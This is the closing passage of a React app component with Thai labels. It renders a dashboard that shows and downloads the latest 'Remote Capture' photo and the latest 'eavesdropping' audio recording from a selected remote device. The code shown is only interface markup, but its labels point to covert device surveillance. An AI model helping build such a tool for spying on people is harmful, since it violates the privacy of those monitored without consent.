                        <h2 className="text-md font-bold text-slate-100 flex items-center gap-2">

                          🖼️ รูปภาพล่าสุด

                        </h2>

                        <div className="flex items-center gap-2">

                            <a
                              href={lastPhoto}
                              download={`photo_${selectedDevice?.name || selectedDeviceId}_${new Date().getTime()}.jpg`}
                              className="text-xs text-indigo-400 hover:text-indigo-300 hover:bg-indigo-400/10 px-2 py-1 rounded border border-indigo-500/30 transition-colors"
                            >
                              ⬇️ บันทึกรูป
                            </a>
                            <button
                              onClick={handleClearPhoto}
                              className="text-xs text-red-400 hover:text-red-300 hover:bg-red-400/10 px-2 py-1 rounded border border-red-500/30 transition-colors"
                            >
                              ลบรูป
                            </button>

                          <span className="bg-emerald-500/20 text-emerald-400 text-[10px] font-bold px-2 py-1 rounded-full uppercase tracking-wider">

                            New

                          </span>

                        </div>

                      </div>

                      <div className="relative bg-black w-full flex items-center justify-center min-h-[200px]">

                        <img src={lastPhoto} alt="Remote Capture" className="w-full h-auto object-cover opacity-90 hover:opacity-100 transition-opacity" />

                      </div>

                    </div>

                  )}

                  {/* Audio Result */}
                  {lastAudio && (
                    <div className="bg-slate-900 border border-slate-800 rounded-3xl overflow-hidden shadow-2xl flex flex-col mt-4">
                      <div className="px-6 py-4 bg-slate-900 border-b border-slate-800 flex justify-between items-center z-10">
                        <h2 className="text-md font-bold text-slate-100 flex items-center gap-2">
                          🎤 ไฟล์เสียงดักฟังล่าสุด
                        </h2>
                        <div className="flex items-center gap-2">
                          <a
                            href={lastAudio}
                            download={`audio_${selectedDevice?.name || selectedDeviceId}_${new Date().getTime()}.m4a`}
                            className="text-xs text-indigo-400 hover:text-indigo-300 hover:bg-indigo-400/10 px-2 py-1 rounded border border-indigo-500/30 transition-colors"
                          >
                            ⬇️ บันทึกไฟล์เสียง
                          </a>
                          <button
                            onClick={handleClearAudio}
                            className="text-xs text-red-400 hover:text-red-300 hover:bg-red-400/10 px-2 py-1 rounded border border-red-500/30 transition-colors"
                          >
                            ลบไฟล์เสียง
                          </button>
                          <span className="bg-emerald-500/20 text-emerald-400 text-[10px] font-bold px-2 py-1 rounded-full uppercase tracking-wider">
                            New
                          </span>
                        </div>
                      </div>
                      <div className="bg-slate-950 w-full flex items-center justify-center p-6">
                        <audio controls src={lastAudio} className="w-full" />
                      </div>
                    </div>
                  )}



                </div>

              </div>

            </main>

          )}

        </div>

      </div>

    </div>

  );

}



export default App;
